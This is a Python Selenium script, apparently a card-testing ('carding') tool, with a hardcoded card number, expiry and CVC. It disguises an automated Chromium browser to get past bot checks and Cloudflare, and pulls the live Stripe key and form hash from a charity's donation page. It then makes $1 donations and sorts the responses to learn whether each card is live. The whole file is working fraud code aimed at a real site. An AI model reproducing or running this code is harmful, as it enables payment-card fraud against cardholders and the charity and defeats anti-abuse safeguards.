import time
import re
import json
import random
import os
import sys


# ═══════════════════════════════════════════════════════════
# CONFIG
# ═══════════════════════════════════════════════════════════

TARGET_URL = 'https://goodhope.org/giving/?form-id=12124&payment-mode=stripe&level-id=custom&custom-amount=1.00'

CARD_NUMBER = '5104040287872188'
EXP_MONTH = '12'
EXP_YEAR = '27'
CVC = '951'

FIRST_NAME = 'James'
LAST_NAME = 'Smith'
EMAIL = f'james{random.randint(100,999)}@gmail.com'
ADDRESS = '123 Main Street'
CITY = 'New York'
STATE = 'NY'
ZIP = '10001'
COUNTRY = 'US'


def setup_driver():
    """إعداد Chrome Driver - Xvfb mode (غير headless)"""
    print("🚀 Setting up driver (Xvfb + undetected)...")
    
    # ═══ Try undetected-chromedriver ═══
    try:
        import undetected_chromedriver as uc
        
        print("✅ Using undetected-chromedriver")
        
        options = uc.ChromeOptions()
        options.binary_location = '/usr/bin/chromium'
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--start-maximized')
        
        # ⚠️ مهم: مش headless (Xvfb هيوفر الشاشة)
        # options.add_argument('--headless=new')
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument('--disable-features=IsolateOrigins,site-per-process')
        options.add_argument('--disable-background-timer-throttling')
        options.add_argument('--disable-backgrounding-occluded-windows')
        options.add_argument('--disable-renderer-backgrounding')
        
        options.add_argument(
            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
        )
        
        # ═══ Anti-detection preferences ═══
        prefs = {
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False,
            "profile.default_content_setting_values.notifications": 2,
            "profile.default_content_setting_values.media_stream": 2,
            "profile.default_content_setting_values.geolocation": 2,
        }
        options.add_experimental_option("prefs", prefs)
        
        driver = None
        
        # Try various versions
        for version in [139, 138, 137, 131, 130, 129, 123, 120, None]:
            try:
                print(f"   Trying version_main={version}...")
                
                kwargs = {
                    'options': options,
                    'use_subprocess': True
                }
                
                if version is not None:
                    kwargs['version_main'] = version
                
                if os.path.exists('/usr/bin/chromedriver'):
                    kwargs['driver_executable_path'] = '/usr/bin/chromedriver'
                
                driver = uc.Chrome(**kwargs)
                print(f"✅ Launched with version={version}")
                break
            except Exception as e:
                print(f"   ⚠️ version={version} failed: {str(e)[:80]}")
                continue
        
        if driver is None:
            raise Exception("All undetected versions failed")
    
    except Exception as e:
        print(f"⚠️ undetected failed: {e}")
        print("⚠️ Falling back to regular Selenium")
        
        from selenium import webdriver
        from selenium.webdriver.chrome.options import Options
        from selenium.webdriver.chrome.service import Service
        
        options = Options()
        options.binary_location = '/usr/bin/chromium'
        options.add_argument('--no-sandbox')
        options.add_argument('--disable-dev-shm-usage')
        options.add_argument('--disable-gpu')
        options.add_argument('--window-size=1920,1080')
        options.add_argument('--start-maximized')
        
        # ⚠️ مش headless
        # options.add_argument('--headless=new')
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        options.add_argument(
            'user-agent=Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36'
        )
        options.add_experimental_option("excludeSwitches", ["enable-automation"])
        options.add_experimental_option('useAutomationExtension', False)
        
        prefs = {
            "credentials_enable_service": False,
            "profile.password_manager_enabled": False,
        }
        options.add_experimental_option("prefs", prefs)
        
        if os.path.exists('/usr/bin/chromedriver'):
            service = Service('/usr/bin/chromedriver')
            driver = webdriver.Chrome(service=service, options=options)
        else:
            driver = webdriver.Chrome(options=options)
    
    # ═══ إخفاء آثار الأتمتة ═══
    try:
        driver.execute_cdp_cmd('Network.setUserAgentOverride', {
            "userAgent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Safari/537.36"
        })
    except:
        pass
    
    scripts = [
        "Object.defineProperty(navigator, 'webdriver', {get: () => undefined})",
        "Object.defineProperty(navigator, 'plugins', {get: () => [1, 2, 3, 4, 5]})",
        "Object.defineProperty(navigator, 'languages', {get: () => ['en-US', 'en']})",
        "Object.defineProperty(navigator, 'hardwareConcurrency', {get: () => 8})",
        "Object.defineProperty(navigator, 'deviceMemory', {get: () => 8})",
        "Object.defineProperty(navigator, 'platform', {get: () => 'Win32'})",
        "window.chrome = {runtime: {}}",
    ]
    
    for script in scripts:
        try:
            driver.execute_script(script)
        except:
            pass
    
    driver.set_page_load_timeout(60)
    driver.set_script_timeout(60)
    
    print("✅ Driver launched (Xvfb mode)")
    return driver


def run():
    print("=" * 60)
    print("🎯 STARTING CHECK")
    print(f"🔗 URL: {TARGET_URL}")
    print(f"💳 Card: {CARD_NUMBER[:4]}...{CARD_NUMBER[-4:]}")
    print(f"🖥️ DISPLAY: {os.environ.get('DISPLAY', 'not set')}")
    print("=" * 60)
    
    driver = None
    try:
        # Setup
        driver = setup_driver()
        
        # Open page
        print(f"\n🌐 Opening page...")
        driver.get(TARGET_URL)
        
        # ═══ انتظر شاشة التحدي + الصفحة الحقيقية ═══
        print("⏳ Waiting for page (with Robot Challenge)...")
        max_wait = 90
        start = time.time()
        real_page = False
        
        while time.time() - start < max_wait:
            try:
                html = driver.page_source
                html_lower = html.lower()
                title = driver.title.lower()
                
                # ═══ Robot Challenge check ═══
                if 'robot challenge' in title or 'robot challenge' in html_lower:
                    elapsed = int(time.time() - start)
                    print(f"   🤖 Robot Challenge... ({elapsed}s)")
                    time.sleep(3)
                    continue
                
                # ═══ Cloudflare check ═══
                if 'just a moment' in html_lower or 'checking your browser' in html_lower:
                    elapsed = int(time.time() - start)
                    print(f"   ⏳ Cloudflare... ({elapsed}s)")
                    time.sleep(3)
                    continue
                
                # ═══ Real page check ═══
                if 'give-form-id' in html or 'givewp' in html_lower:
                    real_page = True
                    print(f"✅ Real page loaded after {int(time.time() - start)}s")
                    break
                
                # ═══ لو الصفحة كبيرة أوي، يمكن حقيقية ═══
                if len(html) > 30000 and 'stripe' in html_lower:
                    real_page = True
                    print(f"✅ Large page with Stripe after {int(time.time() - start)}s")
                    break
                
                time.sleep(2)
            except:
                time.sleep(2)
        
        # ═══ فحص نهائي ═══
        html = driver.page_source
        title = driver.title
        print(f"📄 HTML Length: {len(html)}")
        print(f"📍 Title: {title}")
        print(f"📍 URL: {driver.current_url}")
        
        if 'robot challenge' in title.lower():
            return "ROBOT_CHALLENGE_NOT_BYPASSED"
        
        # ═══ استخرج البيانات ═══
        form_id = '12124'
        form_hash = None
        form_prefix = '12124-1'
        stripe_key = None
        
        m = re.search(r'name="give-form-hash"\s+value="([a-f0-9]+)"', html)
        if m:
            form_hash = m.group(1)
        
        if not form_hash:
            m = re.search(r'give-form-hash["\']?\s*[:=]\s*["\']([a-f0-9]+)', html)
            if m:
                form_hash = m.group(1)
        
        m = re.search(r'pk_(?:live|test)_[A-Za-z0-9]+', html)
        if m:
            stripe_key = m.group(0)
        
        if not form_hash:
            form_hash = '54fcc028ca'
        if not stripe_key:
            stripe_key = 'pk_live_SMtnnvlq4TpJelMdklNha8iD'
        
        print(f"✅ Form ID: {form_id}")
        print(f"✅ Form Hash: {form_hash}")
        print(f"✅ Stripe Key: {stripe_key}")
        
        # ═══ Stripe PM via Elements ═══
        print("\n💳 Generating Stripe PM (via Elements)...")
        
        stripe_js = """
        var callback = arguments[arguments.length - 1];
        var stripeKey = arguments[0];
        var cardNum = arguments[1];
        var expM = arguments[2];
        var expY = arguments[3];
        var cvc = arguments[4];
        
        (async () => {
            try {
                if (typeof Stripe === 'undefined') {
                    await new Promise((resolve, reject) => {
                        const s = document.createElement('script');
                        s.src = 'https://js.stripe.com/v3/';
                        s.onload = resolve;
                        s.onerror = () => reject(new Error('Stripe.js load failed'));
                        document.head.appendChild(s);
                    });
                    await new Promise(r => setTimeout(r, 2000));
                }
                
                const stripe = Stripe(stripeKey);
                
                // ═══ إنشاء Elements مؤقت ═══
                const container = document.createElement('div');
                container.id = 'temp-stripe-elements';
                container.style.cssText = 'position:fixed;left:-9999px;top:-9999px;width:400px;';
                document.body.appendChild(container);
                
                const elements = stripe.elements();
                const cardElement = elements.create('card', {
                    style: {base: {fontSize: '16px'}}
                });
                cardElement.mount('#temp-stripe-elements');
                
                await new Promise(r => setTimeout(r, 500));
                
                // ═══ إنشاء PM ═══
                const result = await stripe.createPaymentMethod({
                    type: 'card',
                    card: cardElement,
                    billing_details: {
                        name: 'James Smith',
                        email: 'james.smith@gmail.com',
                        address: {
                            line1: '123 Main Street',
                            city: 'New York',
                            state: 'NY',
                            postal_code: '10001',
                            country: 'US'
                        }
                    }
                });
                
                try {
                    cardElement.destroy();
                    container.remove();
                } catch (e) {}
                
                if (result.error) {
                    callback(JSON.stringify({
                        error: result.error.message,
                        code: result.error.code,
                        decline_code: result.error.decline_code
                    }));
                } else {
                    callback(JSON.stringify({
                        pm_id: result.paymentMethod.id,
                        success: true
                    }));
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
        })();
        """
        
        try:
            result_raw = driver.execute_async_script(
                stripe_js,
                stripe_key,
                CARD_NUMBER,
                EXP_MONTH,
                EXP_YEAR,
                CVC
            )
            
            print(f"📥 Stripe: {result_raw[:500]}")
            
            pm_data = json.loads(result_raw)
            
            if 'error' in pm_data:
                error = pm_data['error']
                decline = pm_data.get('decline_code', '')
                code = pm_data.get('code', '')
                
                if decline:
                    return f"STRIPE_{decline.upper()}"
                if code:
                    return f"STRIPE_{code.upper()}"
                
                if 'insufficient' in error.lower():
                    return "INSUFFICIENT_FUNDS"
                if 'declined' in error.lower():
                    return "DECLINED"
                
                return f"STRIPE_ERROR: {error[:150]}"
            
            pm_id = pm_data.get('pm_id')
            print(f"✅ PM: {pm_id}")
            
            # ═══ Submit donation ═══
            print("\n💸 Submitting donation...")
            
            # Fill + submit
            fill_submit_js = """
            var callback = arguments[arguments.length - 1];
            var args = arguments;
            
            try {
                // Fill fields
                var fields = {
                    'give-amount': '1.00',
                    'give_first': args[0],
                    'give_last': args[1],
                    'give_email': args[2]
                };
                
                for (var name in fields) {
                    var input = document.querySelector('[name="' + name + '"]');
                    if (input) {
                        input.value = fields[name];
                        input.dispatchEvent(new Event('input', {bubbles: true}));
                        input.dispatchEvent(new Event('change', {bubbles: true}));
                    }
                }
                
                // Add hidden fields
                var hidden = {
                    'give_stripe_payment_method': args[3],
                    'give_action': 'purchase',
                    'give-gateway': 'stripe'
                };
                
                for (var name in hidden) {
                    var input = document.querySelector('[name="' + name + '"]');
                    if (!input) {
                        input = document.createElement('input');
                        input.type = 'hidden';
                        input.name = name;
                        document.body.appendChild(input);
                    }
                    input.value = hidden[name];
                }
                
                // Find submit button
                var submitBtn = document.querySelector('button[type="submit"]') ||
                                document.querySelector('input[type="submit"]') ||
                                document.querySelector('.give-submit') ||
                                document.querySelector('button.give-submit');
                
                if (submitBtn) {
                    submitBtn.click();
                    callback(JSON.stringify({success: true, action: 'clicked'}));
                } else {
                    var form = document.querySelector('form[id*="give-form"]') ||
                               document.querySelector('form');
                    if (form) {
                        form.submit();
                        callback(JSON.stringify({success: true, action: 'form_submit'}));
                    } else {
                        callback(JSON.stringify({error: 'No button/form found'}));
                    }
                }
            } catch (e) {
                callback(JSON.stringify({error: 'Exception: ' + e.message}));
            }
            """
            
            try:
                submit_result = driver.execute_async_script(
                    fill_submit_js,
                    FIRST_NAME,
                    LAST_NAME,
                    EMAIL,
                    pm_id
                )
                print(f"🖱️ Submit: {submit_result}")
            except Exception as e:
                print(f"⚠️ Submit error: {e}")
            
            # ═══ Wait for result ═══
            print("\n⏳ Waiting for result...")
            
            result_text = ""
            max_wait_result = 30
            start_result = time.time()
            
            while time.time() - start_result < max_wait_result:
                try:
                    text_now = driver.find_element("tag name", "body").text
                    text_lower = text_now.lower()
                    
                    live_keywords = [
                        'insufficient', 'declined', 'expired',
                        'fraud', 'do not honor', 'do_not_honor',
                        'thank you', 'success', 'complete',
                        'failed', 'card_error', 'processing_error',
                        'your card', 'your donation'
                    ]
                    
                    for kw in live_keywords:
                        if kw in text_lower:
                            result_text = text_now
                            break
                    
                    if result_text:
                        break
                    
                    time.sleep(1)
                except:
                    time.sleep(1)
            
            if result_text:
                return parse_result(result_text, driver.page_source)
            
            return "NO_RESULT"
        
        except Exception as e:
            return f"Error: {str(e)[:200]}"
    
    except Exception as e:
        return f"Fatal: {str(e)[:200]}"
    
    finally:
        if driver:
            try:
                driver.quit()
            except:
                pass


def parse_result(text, html=""):
    text_lower = text.lower()
    html_lower = html.lower()
    
    responses = {
        'insufficient_funds': 'INSUFFICIENT_FUNDS',
        'your card has insufficient': 'INSUFFICIENT_FUNDS',
        'insufficient funds': 'INSUFFICIENT_FUNDS',
        'card was declined': 'DECLINED',
        'your card was declined': 'DECLINED',
        'expired_card': 'EXPIRED_CARD',
        'your card has expired': 'EXPIRED_CARD',
        'suspected fraud': 'SUSPECTED_FRAUD',
        'incorrect_cvc': 'CVV_FAILURE',
        'security code is incorrect': 'CVV_FAILURE',
        'incorrect_number': 'INVALID_CARD_NUMBER',
        'do_not_honor': 'DO_NOT_HONOR',
        'do not honor': 'DO_NOT_HONOR',
        'processing_error': 'PROCESSING_ERROR',
        'thank you': 'CHARGE 1.0',
        'success': 'CHARGE 1.0',
        'donation complete': 'CHARGE 1.0',
    }
    
    for kw, resp in responses.items():
        if kw in text_lower:
            return resp
    
    for kw, resp in responses.items():
        if kw in html_lower:
            return resp
    
    if text.strip():
        return f"UNKNOWN: {' '.join(text.split())[:200]}"
    
    return "NO_RESULT"


if __name__ == '__main__':
    result = run()
    print("\n" + "=" * 60)
    print(f"📊 FINAL: {result}")
    print("=" * 60)
